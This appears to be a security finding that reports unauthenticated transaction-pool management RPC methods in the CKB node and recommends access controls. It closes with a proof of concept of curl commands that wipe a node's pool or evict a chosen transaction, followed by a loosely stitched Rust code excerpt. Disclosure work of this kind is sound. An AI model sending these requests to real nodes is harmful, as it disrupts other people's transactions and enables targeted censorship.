### Title
Unauthenticated RPC Methods Allow Any Caller to Wipe the Entire Transaction Pool — (`rpc/src/module/pool.rs`)

---

### Summary

CKB exposes `clear_tx_pool` and `clear_tx_verify_queue` as unauthenticated JSON-RPC methods with no access control. Any caller who can reach the RPC endpoint can silently wipe all pending transactions from the pool or the verification queue. This is a direct structural analog to the Augur `clearCrowdsourcers` issue: a destructive state-clearing operation is exposed without any caller restriction.

---

### Finding Description

In `rpc/src/module/pool.rs`, the `PoolRpc` trait declares two destructive methods as standard, unauthenticated JSON-RPC endpoints:

- `clear_tx_pool` (line 322–323): removes **all** transactions from the pending/proposed pool.
- `clear_tx_verify_queue` (line 349–350): removes **all** transactions from the async verification queue. [1](#0-0) [2](#0-1) 

Their implementations delegate directly to the tx-pool service with no caller identity check: [3](#0-2) 

The underlying `TxPoolService::clear_pool` acquires a write lock and calls `tx_pool.clear(...)`, resetting the entire pool state: [4](#0-3) 

A third method, `remove_transaction` (line 254–255), allows targeted removal of any specific transaction and all its descendants, also with no access control: [5](#0-4) [6](#0-5) 

The CKB RPC layer has no built-in authentication mechanism. There is no API key, token, or caller-identity check anywhere in the `PoolRpcImpl` implementation. [7](#0-6) 

---

### Impact Explanation

An attacker who can reach the RPC endpoint can:

1. Call `clear_tx_pool` to instantly evict every pending and proposed transaction from the pool, forcing all users to resubmit their transactions and halting block assembly for miners.
2. Call `clear_tx_verify_queue` to drop all transactions currently undergoing script verification, silently discarding work in progress.
3. Call `remove_transaction` with a known tx hash to surgically evict a specific high-value transaction (e.g., a time-sensitive DeFi or DAO withdrawal) before it is mined.

The impact is: **disruption of transaction finality, miner revenue loss, and targeted censorship of specific transactions** — all without leaving any on-chain trace.

---

### Likelihood Explanation

- Many CKB node operators expose the RPC port publicly (e.g., for dApp backends, block explorers, or mining pools), making the endpoint reachable by untrusted callers.
- Even on localhost-only deployments, SSRF vulnerabilities in co-located web services can reach `127.0.0.1:8114`.
- The attack requires only a single HTTP POST with a valid JSON-RPC body — no credentials, no proof of work, no stake.
- The methods are documented in the public RPC spec, so their existence and effect are well-known.

---

### Recommendation

1. **Restrict destructive pool management methods** behind an explicit opt-in configuration flag (e.g., `enable_unsafe_rpc = true`) that is disabled by default, similar to how some nodes gate `miner`-module methods.
2. **Add an IP allowlist** for the RPC server so that methods like `clear_tx_pool`, `clear_tx_verify_queue`, and `remove_transaction` are only callable from explicitly trusted addresses.
3. **Separate the RPC surface**: expose read-only pool methods on the public port and destructive management methods only on a separate, localhost-only admin port.
4. Add documentation warnings on these methods that they are operator-only and must not be exposed to untrusted callers.

---

### Proof of Concept

```bash
# Wipe the entire transaction pool on a node with RPC exposed on port 8114
curl -s -X POST http://<node-ip>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'

# Expected response: {"id":1,"jsonrpc":"2.0","result":null}
# Effect: all pending and proposed transactions are evicted from the pool.

# Wipe the verification queue
curl -s -X POST http://<node-ip>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"clear_tx_verify_queue","params":[]}'

# Surgically remove a known transaction before it is mined
curl -s -X POST http://<node-ip>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"remove_transaction","params":["0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"]}'
```

No authentication, no special headers, and no prior state are required. The pool is cleared immediately upon receipt of the request.

        well_known_lock_scripts.append(&mut extra_well_known_lock_scripts);
        well_known_type_scripts.append(&mut extra_well_known_type_scripts);

        PoolRpcImpl {
            shared,
            well_known_lock_scripts,
            well_known_type_scripts,
        }
    }

    fn check_output_validator(
        &self,
        outputs_validator: Option<OutputsValidator>,
        tx: &TransactionView,
    ) -> Result<()> {
        if let Err(e) = match outputs_validator {
            None | Some(OutputsValidator::Passthrough) => Ok(()),
            Some(OutputsValidator::WellKnownScriptsOnly) => WellKnownScriptsOnlyValidator::new(
                self.shared.consensus(),
                &self.well_known_lock_scripts,
                &self.well_known_type_scripts,
            )
            .validate(tx),
        } {
            return Err(RPCError::custom_with_data(
                RPCError::PoolRejectedTransactionByOutputsValidator,
                format!(
                    "The transaction is rejected by OutputsValidator set in params[1]: {}. \
                    Please check the related information in https://github.com/nervosnetwork/ckb/wiki/Transaction-%C2%BB-Default-Outputs-Validator",
                    outputs_validator
                        .unwrap_or(OutputsValidator::WellKnownScriptsOnly)
                        .json_display()
                ),
                e,
            ));
        }
        Ok(())
    }

    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }

        Ok(())
    }
